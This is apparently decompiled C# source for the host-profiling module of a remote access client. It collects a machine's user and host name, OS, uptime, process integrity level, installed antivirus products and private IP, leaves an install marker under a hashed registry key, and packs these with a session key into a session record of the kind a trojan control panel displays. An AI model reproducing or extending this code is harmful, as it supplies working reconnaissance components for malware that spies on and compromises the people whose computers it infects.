using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Management;
using System.Net;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using Microsoft.Win32;
using Models;
using algorithm;

namespace newClient.Utilities;

public class clienthelper
{
	private static string UseFormat = "yyyy'/'MM'/'dd' 'HH':'mm':'ss";

	public static string MachineName
	{
		get
		{
			try
			{
				return Environment.MachineName + "_" + Environment.UserName;
			}
			catch (Exception ex)
			{
				Logger.Info(ex.Message + "\r\n" + ex.StackTrace);
			}
			return "unknown";
		}
	}

	public static string OperatingSystem
	{
		get
		{
			//IL_0005: Unknown result type (might be due to invalid IL or missing references)
			//IL_000b: Expected O, but got Unknown
			//IL_0025: Unknown result type (might be due to invalid IL or missing references)
			//IL_002b: Expected O, but got Unknown
			try
			{
				ManagementObjectSearcher val = new ManagementObjectSearcher("select * from Win32_OperatingSystem");
				try
				{
					ManagementObjectEnumerator enumerator = val.Get().GetEnumerator();
					try
					{
						if (enumerator.MoveNext())
						{
							ManagementObject val2 = (ManagementObject)enumerator.get_Current();
							string text = ((ManagementBaseObject)val2).get_Item("Caption").ToString()!.Replace("Microsoft ", "");
							return (text + ((ManagementBaseObject)val2).get_Item("OSArchitecture")).Replace(" ", "");
						}
					}
					finally
					{
						((IDisposable)enumerator)?.Dispose();
					}
				}
				finally
				{
					((IDisposable)val)?.Dispose();
				}
			}
			catch (Exception)
			{
			}
			return "unknown";
		}
	}

	public static string StatrTime
	{
		get
		{
			//IL_000a: Unknown result type (might be due to invalid IL or missing references)
			//IL_0010: Expected O, but got Unknown
			try
			{
				PerformanceCounter val = new PerformanceCounter("System", "System Up Time");
				try
				{
					val.NextValue();
					return new DateTime(DateTime.Now.Ticks - TimeSpan.FromSeconds(val.NextValue()).Ticks).ToString(UseFormat);
				}
				finally
				{
					((IDisposable)val)?.Dispose();
				}
			}
			catch (Exception)
			{
			}
			return "unknown";
		}
	}

	public static string Install
	{
		get
		{
			try
			{
				string hash = Hash.GetHash(Environment.MachineName, "@");
				using RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("SOFTWARE\\" + hash);
				string text = registryKey.GetValue(hash + "T", null) as string;
				if (string.IsNullOrEmpty(text))
				{
					registryKey.SetValue(hash + "T", DateTime.Now.ToString(UseFormat));
				}
				return text ?? DateTime.Now.ToString(UseFormat);
			}
			catch (Exception)
			{
			}
			return "unknown";
		}
	}

	public static string currentProcess
	{
		get
		{
			try
			{
				return Process.GetCurrentProcess().ProcessName + ".exe";
			}
			catch (Exception)
			{
			}
			return "unknown";
		}
	}

	public static string antivirus
	{
		get
		{
			//IL_0019: Unknown result type (might be due to invalid IL or missing references)
			//IL_001f: Expected O, but got Unknown
			try
			{
				ManagementObjectSearcher val = new ManagementObjectSearcher("\\\\" + Environment.MachineName + "\\root\\SecurityCenter2", "Select * from AntivirusProduct");
				try
				{
					List<string> list = new List<string>();
					ManagementObjectEnumerator enumerator = val.Get().GetEnumerator();
					try
					{
						while (enumerator.MoveNext())
						{
							ManagementBaseObject current = enumerator.get_Current();
							list.Add(current.get_Item("displayName").ToString());
						}
					}
					finally
					{
						((IDisposable)enumerator)?.Dispose();
					}
					return (list.Count == 0) ? "N/A" : string.Join("/", list.ToArray());
				}
				finally
				{
					((IDisposable)val)?.Dispose();
				}
			}
			catch (Exception)
			{
			}
			return "unknown";
		}
	}

	public static string Country => null;

	public static string Privileges => getPrivileges(Process.GetCurrentProcess().Handle);

	public static string Netrunver => Environment.Version.ToString();

	internal static string PrivateIp
	{
		get
		{
			try
			{
				NetworkInterface[] allNetworkInterfaces = NetworkInterface.GetAllNetworkInterfaces();
				NetworkInterface[] array = allNetworkInterfaces;
				foreach (NetworkInterface networkInterface in array)
				{
					if (networkInterface.OperationalStatus != OperationalStatus.Up || networkInterface.NetworkInterfaceType == NetworkInterfaceType.Loopback)
					{
						continue;
					}
					IPInterfaceProperties iPProperties = networkInterface.GetIPProperties();
					if (iPProperties.GatewayAddresses.Count == 0 || iPProperties.GatewayAddresses[0].Address.Equals(IPAddress.Parse("0.0.0.0")))
					{
						continue;
					}
					foreach (UnicastIPAddressInformation unicastAddress in iPProperties.UnicastAddresses)
					{
						if (unicastAddress.Address.AddressFamily == AddressFamily.InterNetwork && !IPAddress.IsLoopback(unicastAddress.Address))
						{
							return unicastAddress.Address?.ToString() ?? Dns.GetHostEntry(Dns.GetHostName()).AddressList.FirstOrDefault((IPAddress adr) => adr.AddressFamily == AddressFamily.InterNetwork)!.ToString();
						}
					}
				}
			}
			catch (Exception)
			{
			}
			return "unknown";
		}
	}

	public static string getPrivileges(IntPtr Handle)
	{
		try
		{
			IntPtr zero = IntPtr.Zero;
			string result = null;
			if (NativeInvoke.OpenProcessToken(Handle, 10u, out var TokenHandle))
			{
				if (!NativeInvoke.GetTokenInformation(TokenHandle, 25u, zero, 0u, out var ReturnLength))
				{
					IntPtr intPtr = Marshal.AllocHGlobal(ReturnLength);
					if (NativeInvoke.GetTokenInformation(TokenHandle, 25u, intPtr, (uint)(int)ReturnLength, out ReturnLength))
					{
						IntPtr pSid = Marshal.ReadIntPtr(intPtr);
						result = Marshal.ReadInt32(NativeInvoke.GetSidSubAuthority(pSid, (uint)(Marshal.ReadInt32(NativeInvoke.GetSidSubAuthorityCount(pSid)) - 1))) switch
						{
							0 => "Untrusted", 
							4096 => "Low", 
							8192 => "Medium", 
							8448 => "Medium+ +", 
							12288 => "High", 
							16384 => "system", 
							_ => "unknown", 
						};
					}
					Marshal.FreeHGlobal(intPtr);
				}
				NativeInvoke.CloseHandle(TokenHandle);
			}
			return result;
		}
		catch (Exception)
		{
		}
		return "unknown";
	}

	public static _sessiongrid GetSessioninfo()
	{
		Logger.Info("GetSessioninfo");
		return new _sessiongrid
		{
			ip = null,
			MachineName = MachineName,
			OperatingSystem = OperatingSystem,
			StatrTime = StatrTime,
			Install = Install,
			Privileges = Privileges,
			Antivirus = antivirus,
			net = Netrunver,
			Country = Country,
			name = currentProcess,
			ProtocolType = null,
			mmmd5 = config.SessionKey,
			PrivateIp = PrivateIp
		};
	}
}
